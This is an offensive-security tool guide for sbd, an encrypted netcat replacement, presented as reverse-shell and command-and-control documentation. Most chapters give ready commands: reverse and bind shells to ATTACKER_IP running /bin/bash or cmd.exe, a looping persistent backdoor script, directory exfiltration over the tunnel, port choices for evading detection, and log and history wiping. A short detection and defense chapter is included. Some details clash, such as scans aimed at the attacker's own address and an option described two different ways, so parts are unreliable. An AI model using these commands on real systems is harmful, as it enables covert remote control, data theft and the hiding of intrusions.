---
title: "sbd - Secure Backdoor"
description: "Encrypted netcat replacement with built-in encryption for secure reverse shells"
category: "reverse_shells"
mitre_tactic: command_and_control
mitre_tactic_id: TA0011
package: "sbd"
kali_install: "sudo apt install sbd"
---

# sbd

## Overview

sbd (Secure Backdoor) is a netcat replacement with built-in encryption. It provides the same data transfer capabilities as netcat but encrypts all traffic using AES-256 encryption with a pre-shared key. sbd is designed for covert communication channels where encryption is required but a full VPN solution is not practical.

sbd works by establishing an encrypted connection using a pre-shared key. The key is used to derive an AES-256 encryption key, which encrypts all data transmitted through the tunnel. This provides confidentiality and integrity for the communication channel.

The tool is particularly useful for creating encrypted reverse shells, secure file transfers, and covert communication channels. Unlike netcat, which transmits data in cleartext, sbd protects all traffic from network monitoring and interception.

## Chapter 1: Installation

### Kali Linux

```bash
sudo apt update
sudo apt install sbd
```

### From Source

```bash
git clone https://github.com/Ganapati/sbd.git
cd sbd
make
sudo make install
```

### Verify Installation

```bash
sbd -h
```

### Check Dependencies

```bash
# sbd has minimal dependencies
# Verify it's working
sbd -V
```

## Chapter 2: Basic Usage

### Listen for Connections

```bash
sbd -l -p 4444 -k password
```

**Explanation**: `-l` sets listener mode, `-p` specifies the port, `-k` sets the pre-shared encryption key. sbd uses AES-256 encryption with the provided key to protect all transmitted data.

### Connect to Remote Host

```bash
sbd ATTACKER_IP 4444 -k password
```

**Explanation**: Connects to the specified host and port using the same pre-shared key for encryption. Both sides must use identical keys for successful communication.

### Reverse Shell

```bash
# Attacker
sbd -l -p 4444 -k password

# Target
sbd ATTACKER_IP 4444 -k password -e /bin/bash
```

**Explanation**: sbd connects back to the attacker and executes `/bin/bash`, providing an encrypted reverse shell. All shell traffic is encrypted using AES-256.

### Verify Connection

```bash
# Check if port is listening
ss -tlnp | grep 4444

# Test connectivity
nc -zv 127.0.0.1 4444
```

**Explanation**: Verify sbd is running by checking the listening port and testing connectivity.

## Chapter 3: Encryption

### Key Generation

```bash
sbd -k "my_secret_key" -g
```

**Explanation**: Generates a random encryption key based on the provided passphrase. The generated key can be used with the `-k` flag to ensure both sides use the same encryption parameters.

### Pre-Shared Key

```bash
# Both sides must use the same key
sbd -l -p 4444 -k "S3cr3tK3y!@#$%"
sbd ATTACKER_IP 4444 -k "S3cr3tK3y!@#$%"
```

**Explanation**: The pre-shared key is used to derive the AES-256 encryption key. A strong passphrase is essential for security. The key must be identical on both the listener and the connecting side.

### Key Management

```bash
# Generate strong key
KEY=$(openssl rand -hex 32)
echo $KEY > /tmp/sbd.key

# Use key file
sbd -l -p 4444 -k $(cat /tmp/sbd.key)
sbd ATTACKER_IP 4444 -k $(cat /tmp/sbd.key)
```

**Explanation**: Use strong, random keys for encryption. Store keys securely and distribute through secure channels.

### Key Rotation

```bash
# Generate new key for each session
KEY=$(openssl rand -hex 32)
sbd -l -p 4444 -k $KEY
# Distribute key through secure channel
```

**Explanation**: Regularly change encryption keys to limit exposure if a key is compromised. sbd does not support automatic key rotation.

## Chapter 4: Data Transfer

### File Transfer

```bash
# Receiver
sbd -l -p 4444 -k password > received_file

# Sender
sbd ATTACKER_IP 4444 -k password < file_to_send
```

**Explanation**: Files are transferred through the encrypted tunnel. The data is encrypted before transmission and decrypted on receipt, protecting sensitive data during transfer.

### Encrypted Chat

```bash
# Server
sbd -l -p 4444 -k password

# Client
sbd ATTACKER_IP 4444 -k password
```

**Explanation**: Without command execution or file redirection, sbd provides an encrypted bidirectional text channel. Both sides type messages that appear on the other side's terminal.

### Directory Transfer

```bash
# Sender
tar czf - /path/to/directory | sbd ATTACKER_IP 4444 -k password

# Receiver
sbd -l -p 4444 -k password | tar xzf -
```

**Explanation**: Transfer directories by compressing with tar and piping through the encrypted tunnel.

### Binary Transfer

```bash
# Send binary file
sbd ATTACKER_IP 4444 -k password < binary_file

# Receive binary file
sbd -l -p 4444 -k password > binary_file
```

**Explanation**: sbd handles binary data correctly, preserving file integrity through the encrypted tunnel.

## Chapter 5: Port Scanning

### Scan with sbd

```bash
sbd -z -v ATTACKER_IP 1-1000
```

**Explanation**: The `-z` flag enables zero-I/O mode for port scanning, and `-v` provides verbose output. sbd scans TCP ports and reports open ones.

### Scan with Timeout

```bash
sbd -z -v -w 2 ATTACKER_IP 1-100
```

**Explanation**: The `-w` flag sets a timeout for each connection attempt. This speeds up scanning by preventing hangs on unresponsive ports.

### UDP Scan

```bash
sbd -z -v -u ATTACKER_IP 53,67,68,123
```

**Explanation**: The `-u` flag enables UDP mode for scanning UDP ports.

## Chapter 6: Advanced Techniques

### Bind Shell

```bash
# Target
sbd -l -p 4444 -k password -e /bin/bash

# Attacker
sbd 192.168.1.100 4444 -k password
```

**Explanation**: sbd listens on the target for incoming connections and provides an encrypted shell. The attacker connects to the target's listening port.

### UDP Mode

```bash
sbd -u -l -p 4444 -k password
```

**Explanation**: The `-u` flag switches to UDP mode. UDP mode provides encryption over connectionless transport, though reliability depends on the application layer.

### Keep Listening

```bash
sbd -l -p 4444 -k password -d
```

**Explanation**: The `-d` flag enables daemon mode, keeping sbd listening after a client disconnects. This allows multiple sequential connections without restarting.

### Custom Shell

```bash
# Target
sbd ATTACKER_IP 4444 -k password -e /bin/sh

# Windows target
sbd ATTACKER_IP 4444 -k password -e cmd.exe
```

**Explanation**: The `-e` flag specifies the program to execute. Use different shells for different operating systems.

### Connection Persistence

```bash
# Create persistent backdoor
cat << 'EOF' > /tmp/sbd-backdoor.sh
#!/bin/bash
while true; do
    sbd ATTACKER_IP 4444 -k password -e /bin/bash
    sleep 10
done
EOF
chmod +x /tmp/sbd-backdoor.sh
```

**Explanation**: Create a persistent backdoor by running sbd in a loop with automatic reconnection.

## Chapter 7: Evasion

### Traffic Analysis Resistance

sbd's encrypted traffic appears as random data to network monitors. Unlike netcat, which transmits data in cleartext, sbd's AES-256 encryption makes deep packet inspection ineffective against detecting command content.

### DNS Evasion

Combine sbd with DNS tunneling tools to hide encrypted traffic within DNS queries, providing additional layers of evasion beyond encryption.

### Port Selection

```bash
# Use common ports
sbd -l -p 443 -k password  # HTTPS
sbd -l -p 53 -k password   # DNS
sbd -l -p 80 -k password   # HTTP
```

**Explanation**: Using common ports makes the encrypted traffic blend with legitimate traffic.

### Traffic Pattern

```bash
# Add random delays
sbd ATTACKER_IP 4444 -k password -i 1

# Limit connection rate
sbd -l -p 4444 -k password -b 1000
```

**Explanation**: Random delays and bandwidth limiting can help evade traffic analysis.

## Chapter 8: Operational Security

### Key Distribution

Pre-shared keys must be securely distributed to both sides before deployment. This can be done through:
- Secure file transfer
- Out-of-band communication
- Embedded in deployment scripts
- Stored in encrypted configuration files

### Key Rotation

Regularly changing the pre-shared key limits the impact of key compromise. sbd does not support automatic key rotation, so manual key changes require restarting the connection.

### Secure Deployment

```bash
# Generate key on attacker
KEY=$(openssl rand -hex 32)

# Transfer key securely
# (use existing secure channel)

# Deploy sbd with key
sbd -l -p 4444 -k $KEY
```

**Explanation**: Deploy sbd with strong, randomly generated keys. Use existing secure channels for key distribution.

### Log Evasion

```bash
# Delete logs after use
history -c
rm -f /tmp/sbd*

# Use /dev/shm for temporary files
sbd -l -p 4444 -k password < /dev/shm/payload
```

**Explanation**: Clean up traces of sbd usage to avoid detection.

## Chapter 9: Detection and Defense

### Network Signatures

- Encrypted traffic on non-standard ports
- Long-lived connections with high entropy
- Unusual data patterns

### IDS/IPS Detection

```
# Suricata rule for sbd
alert tcp any any -> any any (msg:"Encrypted Backdoor Detected"; \
  flow:to_server,established; \
  dsize:>64; \
  threshold:type both,track by_src, count 5, seconds 60; \
  sid:1000001; rev:1;)
```

### Log Analysis

```bash
# Monitor for unusual connections
ss -tnp | grep -E "ESTAB.*:[0-9]{4,5}"

# Check for sbd processes
ps aux | grep sbd

# Review network connections
netstat -an | grep 4444
```

### Defense Recommendations

1. Monitor for encrypted traffic on non-standard ports
2. Implement egress filtering
3. Use host-based firewalls
4. Monitor for process execution of sbd
5. Implement network segmentation

## Chapter 10: Troubleshooting

### Connection Refused

```bash
# Check if port is in use
ss -tlnp | grep 4444

# Check firewall rules
iptables -L -n | grep 4444

# Test with different port
sbd -l -p 4445 -k password
```

### Encryption Errors

```bash
# Verify key matches
# Check both sides use same key

# Test with verbose mode
sbd -l -p 4444 -k password -v
sbd ATTACKER_IP 4444 -k password -v
```

### Shell Not Interactive

```bash
# Use script for PTY
script -qc "sbd -l -p 4444 -k password" /dev/null

# Use python for PTY
sbd ATTACKER_IP 4444 -k password -e "python -c 'import pty; pty.spawn(\"/bin/bash\")'"
```

### Performance Issues

```bash
# Test throughput
dd if=/dev/zero bs=1M count=10 | sbd ATTACKER_IP 4444 -k password

# Check latency
time sbd ATTACKER_IP 4444 -k password -e "echo test"

# Monitor connection
iftop -i eth0

# Optimize for throughput
sbd -l -p 4444 -k password -b 0
```

**Explanation**: Use `-b 0` to disable bandwidth limiting for maximum throughput. Monitor connection health and adjust buffer sizes if needed.

## Chapter 11: Command Reference

### Command Line Options

| Option | Description | Default |
|--------|-------------|---------|
| `-l` | Listen mode | client mode |
| `-p` | Port number | required |
| `-k` | Pre-shared key | required |
| `-e` | Execute program | none |
| `-z` | Zero-I/O scan mode | false |
| `-v` | Verbose output | quiet |
| `-u` | UDP mode | TCP |
| `-d` | Daemon mode | foreground |
| `-g` | Generate key | false |
| `-i` | Input file | none |
| `-o` | Output file | none |
| `-w` | Timeout (seconds) | none |

### Encryption Details

| Parameter | Value |
|-----------|-------|
| Algorithm | AES-256-CBC |
| Key derivation | PBKDF2 |
| IV | Random per session |
| Block size | 16 bytes |
| Key size | 32 bytes |

### Common Ports for C2

| Port | Service | Usage |
|------|---------|-------|
| 443 | HTTPS | Common egress |
| 53 | DNS | Often allowed |
| 80 | HTTP | Almost always allowed |
| 445 | SMB | Windows environments |
| 8080 | HTTP Proxy | Corporate environments |

### Key Rotation Strategy

```bash
# Generate new key daily
NEWKEY=$(openssl rand -hex 32)

# Deploy to server
sbd -l -p 4444 -k "$NEWKEY" -e /bin/bash -d

# Deploy to client (automated)
sbd ATTACKER_IP 4444 -k "$NEWKEY" -e /bin/bash -d
```

**Explanation**: Regular key rotation limits exposure if a key is compromised. Automate key rotation through secure channels.

## Resources

- [sbd Homepage](https://www.kali.org/tools/sbd/)
- [Kali Linux sbd Package](https://packages.debian.org/sbd/)
- [AES Encryption Standard](https://en.wikipedia.org/wiki/Advanced_Encryption_Standard)
- [sbd GitHub](https://github.com/Ganapati/sbd)
- [MITRE ATT&CK Command and Control](https://attack.mitre.org/tactics/TA0011/)
- [Cryptography RFC 3394](https://tools.ietf.org/html/rfc3394)
- [Cryptography RFC 4949](https://tools.ietf.org/html/rfc4949)
